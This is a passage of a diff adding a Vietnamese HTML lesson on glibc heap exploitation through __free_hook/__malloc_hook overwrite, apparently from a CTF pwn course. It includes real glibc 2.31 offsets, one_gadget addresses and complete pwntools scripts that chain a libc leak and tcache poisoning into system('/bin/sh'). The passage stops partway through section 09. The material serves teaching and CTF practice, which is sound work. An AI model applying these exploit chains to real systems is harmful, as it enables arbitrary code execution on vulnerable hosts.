@@ -1,0 +1,483 @@
+<title>Hook Overwrite</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(30px,6.5vw,48px);line-height:1.02;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.frame{font-family:var(--font-mono);font-size:12px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.fr{display:grid;grid-template-columns:140px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:8px 10px;background:var(--surface-2)}
+.fr .o{color:var(--mem);white-space:nowrap}
+.fr.key{background:var(--accent-soft);border-color:var(--accent)}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.picker{display:flex;gap:6px;flex-wrap:wrap;margin:14px 0}
+.picker button{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px;cursor:pointer}
+.picker button.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+.stage{border:1px solid var(--line);border-radius:12px;padding:16px;background:var(--surface-2);font-size:15px;min-height:110px}
+.stage h4{margin:0 0 6px}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 4 · Bài 22</div>
+    <h1>Hook Overwrite</h1>
+    <p class="sub">Đích "cổ điển" của heap trên glibc cũ (≤ 2.33): ghi đè con trỏ hàm <code>__malloc_hook</code> / <code>__free_hook</code> trong libc → lần <code>malloc</code>/<code>free</code> kế gọi vào hàm bạn chọn (<code>system</code> hoặc <mark>one-gadget</mark>). Bài này đi <strong>offset thật glibc 2.31</strong>: <code>__free_hook=+0x1eee48</code>, <code>system=+0x52290</code>. Đơn giản nhưng đã bị gỡ từ glibc 2.34.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Trung–Cao</span>
+      <span class="chip"><b>glibc mẫu:</b> 2.31 Ubuntu 20.04</span>
+      <span class="chip"><b>Cần trước:</b> <a href="tcache_fastbin.html" style="color:inherit">poisoning</a>, leak libc</span>
+      <span class="chip"><b>Thời lượng:</b> ~45 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Cơ chế</a><a href="#s4">04 one-gadget</a><a href="#s5">05 Chọn đích</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Hook là gì:</strong> glibc (cũ) có biến con trỏ hàm <code>__malloc_hook</code>, <code>__free_hook</code>. Nếu khác NULL, <code>malloc</code>/<code>free</code> gọi hook <em>trước</em>. Vốn để debug — thành cửa hậu khi bạn ghi được chúng.</p>
+    <p><strong>Khai thác:</strong> có ghi tùy ý (từ <a href="tcache_fastbin.html">poisoning</a>) + leak libc → ghi <code>__free_hook = system</code>, rồi <code>free(chunk chứa "/bin/sh")</code> → <code>system("/bin/sh")</code>. Hoặc <code>__malloc_hook = one_gadget</code>.</p>
+    <p><strong>Hết thời:</strong> glibc <strong>≥ 2.34 bỏ hook</strong>. Khi đó dùng <a href="fsop.html">FSOP</a> / <a href="exit_handlers.html">exit handler</a> / <a href="house_of_apple2.html">apple2</a>.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>__free_hook = system → free("/bin/sh"). Chỉ áp dụng glibc ≤ 2.33.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🚦 Dùng khi</span>
+        <p>glibc <b>≤ 2.33</b> (check version!) + có ghi tùy ý vào libc (poisoning/largebin/arbitrary write) + leak libc.</p></div>
+      <div class="combat-row"><span class="lab">🔢 Offset thật 2.31 (Ubuntu 20.04)</span>
+<pre><code>system       = libc + 0x52290
+__free_hook  = libc + 0x1eee48
+__malloc_hook= libc + 0x1ecb70
+/bin/sh      = libc + 0x1b45bd
+one_gadget   = libc + 0xe3afe / 0xe3b01 / 0xe3b04</code></pre></div>
+      <div class="combat-row"><span class="lab">✅ Cách 1: free_hook = system (ổn nhất)</span>
+<pre><code>write(libc.sym.__free_hook, libc.sym.system)
+free(chunk_binsh)   <span class="c"># chunk chứa "/bin/sh\0" → system("/bin/sh")</span></code></pre></div>
+      <div class="combat-row"><span class="lab">✅ Cách 2: malloc_hook = one_gadget</span>
+<pre><code>write(libc.sym.__malloc_hook, libc.address + 0xe3b01)
+malloc(bất_kỳ)      <span class="c"># gọi one_gadget → shell (nếu thỏa constraint)</span></code></pre></div>
+      <div class="combat-row"><span class="lab">⚠️ Lưu ý</span>
+        <p>free_hook nhận arg = con trỏ chunk (dễ làm "/bin/sh"); malloc_hook nhận size (khó) → ghép one_gadget. one_gadget có constraint (<code>rsp&amp;0xf==0</code>...) — thử nhiều. ≥2.34 KHÔNG còn hook.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Hook của malloc</h2>
+  <p>glibc để lại cơ chế gắn "hàm thay thế" cho allocator (phục vụ debug/profiling): các biến toàn cục trong libc là con trỏ hàm.</p>
+  <pre><code><span class="c">// trong libc (glibc ≤2.33)</span>
+void *(*__malloc_hook)(size_t, const void*);
+void  (*__free_hook)(void*, const void*);
+<span class="c">// malloc(n):  if(__malloc_hook) return __malloc_hook(n, RET_ADDR);</span>
+<span class="c">// free(p):    if(__free_hook)   return __free_hook(p, RET_ADDR);</span></code></pre>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">__free_hook</div><p>Con trỏ hàm gọi khi free(p); nhận p (con trỏ data) làm đối số đầu → rdi.</p></div>
+    <div class="card"><div class="term">__malloc_hook</div><p>Gọi khi malloc(n); nhận size n → rdi.</p></div>
+    <div class="card"><div class="term">one_gadget</div><p>Một địa chỉ trong libc, nhảy tới là execve("/bin/sh") — kèm ràng buộc.</p></div>
+    <div class="card"><div class="term">arbitrary write</div><p>Ghi giá trị vào địa chỉ tùy ý (từ poisoning…).</p></div>
+  </div>
+  <div class="note warn"><span class="tag">Version is everything</span><code>./libc.so.6</code> chạy trực tiếp in version, hoặc <code>strings libc.so.6 | grep "GNU C"</code>. <b>2.34 trở lên: không còn __malloc/free_hook</b> (<code>libc.sym.__free_hook</code> = None) — bài này vô dụng, chuyển FSOP.</div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Cửa hậu hợp pháp của libc</h2>
+  <p>Hook là tính năng gỡ lỗi: cho phép thay allocator lúc chạy. Nhưng nó là <strong>con trỏ hàm nằm trong vùng data ghi được của libc</strong>, và được gọi mỗi lần malloc/free. Với attacker có "ghi tùy ý", đây là đích RCE ngắn nhất: một lần ghi → một lần trigger → shell. Suốt nhiều năm, "ghi __free_hook = system" là bước kết của gần như mọi đề heap. glibc 2.34 gỡ bỏ chính vì lý do đó, đẩy meta sang <a href="fsop.html">FSOP</a>.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ · MỤC LÕI</div>
+  <h2>free_hook = system → shell (số thật 2.31)</h2>
+  <figure class="dg">
+  <svg viewBox="0 0 620 130" role="img" aria-label="ghi __free_hook = system; free(p) với p trỏ /bin/sh gọi system(/bin/sh)" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <defs><marker id="ah" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#e8663e" stroke="none"/></marker></defs>
+    <rect x="30" y="40" width="150" height="46" rx="8" stroke-width="1.6" stroke="#e8663e"/>
+    <text x="105" y="60" text-anchor="middle" font-size="11" fill="#e8663e" stroke="none" font-family="monospace">__free_hook</text>
+    <text x="105" y="76" text-anchor="middle" font-size="9.5" fill="#e8663e" stroke="none" font-family="monospace">+0x1eee48 := &amp;system</text>
+    <rect x="235" y="40" width="150" height="46" rx="8" stroke-width="1.5"/>
+    <text x="310" y="60" text-anchor="middle" font-size="11.5" fill="currentColor" stroke="none" font-family="monospace">free(p)</text>
+    <text x="310" y="76" text-anchor="middle" font-size="10.5" fill="var(--mem)" stroke="none" font-family="monospace">p → "/bin/sh"</text>
+    <rect x="440" y="40" width="150" height="46" rx="8" stroke-width="1.6" stroke="#e8663e"/>
+    <text x="515" y="64" text-anchor="middle" font-size="11" fill="#e8663e" stroke="none" font-family="monospace">system("/bin/sh")</text>
+    <line x1="180" y1="63" x2="233" y2="63" stroke-width="1.4" marker-end="url(#ah)"/>
+    <line x1="385" y1="63" x2="438" y2="63" stroke="#e8663e" stroke-width="1.6" marker-end="url(#ah)"/>
+    <text x="310" y="116" font-size="11" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.72">free gọi hook(p); hook=system, p="/bin/sh" → shell. rdi=p (arg đầu).</text>
+  </svg>
+  <figcaption>Đối số đầu của <code>free(p)</code> chính là <code>p</code> (→ rdi) — nên để <code>p</code> trỏ "/bin/sh" thì <code>system(p)</code> cho shell.</figcaption>
+  </figure>
+
+  <h3>Các bước (số thật, libc base 0x7ffff7dc0000)</h3>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Leak libc</h4><p>Unsorted leak → <code>libc.address = 0x7ffff7dc0000</code>.</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Ghi tùy ý tới __free_hook</h4><p>tcache poisoning cho malloc trả về <code>0x7ffff7faee48</code> (= base+0x1eee48), ghi <code>system = 0x7ffff7e12290</code>.</p></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Chuẩn bị "/bin/sh"</h4><p>Alloc một chunk ghi <code>"/bin/sh\x00"</code> (nhớ con trỏ chunk này).</p></div></div>
+  <div class="step"><div class="n">4</div><div class="body"><h4>Trigger</h4><p><code>free(chunk_binsh)</code> → <code>system("/bin/sh")</code>.</p></div></div>
+
+  <h3>Bảng-byte: ghi hook</h3>
+  <div class="frame">
+    <div class="fr key"><span class="o">0x7ffff7faee48</span><span><code>p64(0x7ffff7e12290)</code> (= &amp;system) ← ghi 8 byte vào __free_hook</span></div>
+    <div class="fr"><span class="o">chunk data</span><span><code>b"/bin/sh\x00"</code> (con trỏ data = đối số system)</span></div>
+  </div>
+ </div>
+</section>
+
+<!-- 04 one-gadget -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / ONE-GADGET</div>
+  <h2>Khi dùng __malloc_hook</h2>
+  <p><code>free_hook</code> tiện vì đối số là con trỏ. <code>malloc_hook</code> nhận <em>size</em> (số), khó biến thành "/bin/sh", nên thường ghép <strong>one_gadget</strong> — một địa chỉ trong libc mà nhảy tới sẽ <code>execve("/bin/sh", NULL, NULL)</code>, với điều kiện (constraint) về thanh ghi/stack.</p>
+  <pre><code><span class="p">$</span> one_gadget ./libc-2.31.so
+<span class="c"># 0xe3afe  execve("/bin/sh", r15, r12)   constraints: [r15]==NULL || r15==NULL ...</span>
+<span class="c"># 0xe3b01  execve("/bin/sh", r15, rdx)    constraints: [r15]==NULL || ...</span>
+<span class="c"># 0xe3b04  execve("/bin/sh", rsi, rdx)    constraints: [rsi]==NULL || ...</span>
+<span class="c"># → thử lần lượt tới khi thỏa (tại thời điểm malloc gọi hook)</span></code></pre>
+  <div class="note tip"><span class="tag">Mẹo trigger malloc_hook</span>Nhiều đề không cho malloc trực tiếp sau khi ghi → trigger gián tiếp: <code>printf("%10000c")</code> (glibc malloc buffer lớn), scanf field dài, hoặc dùng <code>free_hook</code> cho chắc.</div>
+  <div class="note warn"><span class="tag">realloc hook trick</span>Nếu one_gadget nào cũng không thỏa khi gọi từ malloc_hook: đặt <code>__malloc_hook = &amp;realloc+offset</code> (một <code>push</code>/<code>mov</code> dịch stack) và <code>__realloc_hook = one_gadget</code> để chỉnh rsp cho thỏa constraint (kinh điển glibc 2.27–2.31).</div>
+ </div>
+</section>
+
+<!-- 05 Chọn đích -->
+<section class="block" id="s5">
+ <div class="wrap">
+  <div class="secnum">05 / CHỌN ĐÍCH</div>
+  <h2>free_hook hay malloc_hook?</h2>
+  <div class="lab">
+    <div class="picker" id="picker">
+      <button data-s="0" class="active">Có free() + ghi được chunk</button>
+      <button data-s="1">Chỉ malloc(), one_gadget thỏa</button>
+      <button data-s="2">one_gadget không thỏa</button>
+      <button data-s="3">glibc ≥ 2.34</button>
+    </div>
+    <div class="stage" id="stage"></div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Địa chỉ &amp; version</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Có hook không?</h4>
+    <pre><code><span class="p">pwndbg&gt;</span> p &amp;__free_hook    <span class="c"># còn → ≤2.33; "No symbol" → ≥2.34</span>
+<span class="p">$</span> ./libc.so.6            <span class="c"># in version trực tiếp</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Offset qua pwntools</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> libc.sym.__free_hook, libc.sym.system
+(<span class="d">0x1eee48</span>, <span class="d">0x52290</span>)   <span class="c"># 2.31 Ubuntu 20.04</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>one_gadget</h4>
+    <pre><code><span class="p">$</span> one_gadget ./libc-2.31.so   <span class="c"># list gadget + constraints</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ — POISONING → __free_hook → SHELL</div>
+  <h2>Nối tiếp bài poisoning (glibc 2.31)</h2>
+  <p>Đã leak libc, đã ép <code>malloc</code> trả về <code>&amp;__free_hook</code> (= base+0x1eee48). Giờ ghi system &amp; trigger.</p>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · thủ công</button>
+    <button class="tab" data-t="b">B · pwntools</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — glibc 2.31. Poisoning tcache về __free_hook rồi ghi system.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe  = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+<span class="c"># ... alloc/free/edit/show ...</span>
+
+<span class="c"># 1) leak libc (unsorted): base = leak - 0x1ecbe0</span>
+alloc(<span class="d">0</span>,<span class="d">0x4f8</span>); alloc(<span class="d">1</span>,<span class="d">0x18</span>); free(<span class="d">0</span>)
+libc.address = u64(show(<span class="d">0</span>)[:<span class="d">8</span>].ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>)) - <span class="d">0x1ecbe0</span>
+log.success(<span class="s">f"libc={hex(libc.address)}  __free_hook={hex(libc.sym.__free_hook)}"</span>)
+
+<span class="c"># 2) tcache poisoning: fd → __free_hook (2.31 fd thô)</span>
+alloc(<span class="d">2</span>,<span class="d">0x40</span>); free(<span class="d">2</span>)
+edit(<span class="d">2</span>, p64(libc.sym.__free_hook))     <span class="c"># = base+0x1eee48</span>
+alloc(<span class="d">3</span>,<span class="d">0x40</span>); alloc(<span class="d">4</span>,<span class="d">0x40</span>)      <span class="c"># chunk4 == &amp;__free_hook</span>
+
+<span class="c"># 3) ghi system</span>
+edit(<span class="d">4</span>, p64(libc.sym.system))         <span class="c"># __free_hook = base+0x52290</span>
+
+<span class="c"># 4) chuẩn bị "/bin/sh" &amp; trigger</span>
+alloc(<span class="d">5</span>,<span class="d">0x20</span>,b<span class="s">"/bin/sh\x00"</span>); free(<span class="d">5</span>)   <span class="c"># free(p5) → system("/bin/sh")</span>
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật phiên bản</span>glibc ≥2.32: thêm safe-linking cho fd (xem <a href="tcache_fastbin.html">poisoning</a>). glibc ≥2.34: KHÔNG có <code>__free_hook</code> → đoạn này abort, chuyển <a href="fsop.html">FSOP</a>.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — pwntools. one_gadget cho malloc_hook nếu không có free tiện lợi.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+<span class="c"># ... leak libc = ... - 0x1ecbe0 ...</span>
+<span class="c"># cách free_hook (ưu tiên):</span>
+arb_write(libc.sym.__free_hook, libc.sym.system)
+alloc(<span class="d">9</span>,<span class="d">0x20</span>,b<span class="s">"/bin/sh\x00"</span>); free(<span class="d">9</span>)
+<span class="c"># hoặc one_gadget qua malloc_hook:</span>
+<span class="c"># og = libc.address + 0xe3b01</span>
+<span class="c"># arb_write(libc.sym.__malloc_hook, og); malloc(1)  # trigger</span>
+p.interactive()</code></pre>
+<div class="note tip"><span class="tag">Mẹo</span>Luôn thử <b>free_hook trước</b> (không ràng buộc). one_gadget chỉ khi buộc phải qua malloc_hook. Thử cả 3 gadget 0xe3afe/0xe3b01/0xe3b04.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>); libc = get_libc(<span class="s">"./libc.so.6"</span>)
+p = start(); GDB(); m = Menu(prompt=b<span class="s">"&gt;"</span>)
+<span class="c"># ... rebase_libc(leak, 0x1ecbe0) ...</span>
+m.alloc(<span class="d">0</span>,<span class="d">0x40</span>); m.free(<span class="d">0</span>)
+m.edit(<span class="d">0</span>, p64(protect_ptr(chunk0, LIBC.sym.__free_hook)))  <span class="c"># safe-link nếu ≥2.32</span>
+m.alloc(<span class="d">1</span>,<span class="d">0x40</span>); m.alloc(<span class="d">2</span>,<span class="d">0x40</span>); m.edit(<span class="d">2</span>, p64(LIBC.sym.system))
+m.alloc(<span class="d">3</span>,<span class="d">0x20</span>,b<span class="s">"/bin/sh\x00"</span>); m.free(<span class="d">3</span>); ia()</code></pre>
+<div class="note"><span class="tag">pwnld</span><code>one_gadget(LIBC.path)</code> list gadget; <code>protect_ptr</code> cho safe-linking. free_hook vẫn là đường chắc nhất.</div>
+  </div>
+
+  <h3>Checklist khi không ra shell</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>free chạy nhưng không có shell</h4><p>__free_hook=system OK nhưng arg không phải "/bin/sh". Chunk free phải chứa đúng "/bin/sh\0".</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>malloc_hook: crash trong one_gadget</h4><p>Constraint sai. Thử gadget khác, hoặc realloc trick.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>libc.sym.__free_hook = None</h4><p>glibc ≥2.34. Chuyển FSOP.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">one_gadget</div><h4>Tìm magic addr</h4><p>Liệt kê gadget execve + constraints.</p></div>
+    <div class="card"><div class="term">pwntools libc.sym</div><h4>Offset hook</h4><p><code>__free_hook</code>=0x1eee48, <code>system</code>=0x52290 (2.31).</p></div>
+    <div class="card"><div class="term">pwndbg</div><h4>Xác nhận</h4><p><code>p &amp;__free_hook</code>; watch khi free.</p></div>
+    <div class="card"><div class="term">libc-database</div><h4>Đúng version</h4><p>Nhận libc từ leak để biết có hook không.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi không ra shell</h2>
+  <div class="grid">
